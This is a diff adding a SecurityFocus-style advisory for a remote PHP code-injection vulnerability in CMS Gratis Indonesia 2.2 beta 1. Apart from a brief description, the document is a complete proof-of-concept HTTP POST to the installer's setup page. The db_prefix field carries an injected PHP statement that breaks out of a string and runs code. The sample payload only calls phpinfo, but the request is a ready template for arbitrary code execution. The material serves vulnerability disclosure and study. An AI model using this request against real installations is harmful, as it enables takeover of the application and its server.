@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/60337/info
+
+CMS Gratis Indonesia is prone to a remote PHP code-injection vulnerability.
+
+An attacker can exploit this issue to inject and execute arbitrary PHP code in the context of the affected application. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.
+
+CMS Gratis Indonesia 2.2 beta 1 is vulnerable; other versions may also be affected. 
+
+POST /cmsid/?setup=yes HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://www.example.com/cmsid/?setup=yes
+Cookie: __utma=111872281.1795322081.1369810583.1369810583.1369810583.1; __utmz=111872281.1369810583.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); lang=en_US; PHPSESSID=gbf1u3p49bid3b1g4cnhuplco5
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 140
+hostname=localhost&mysql_user=root&mysql_pass=toor&mysql_db_name=cmsid&db_prefix=iw_');phpinfo();//&step_1=Next+%C2%BB%C2%BB
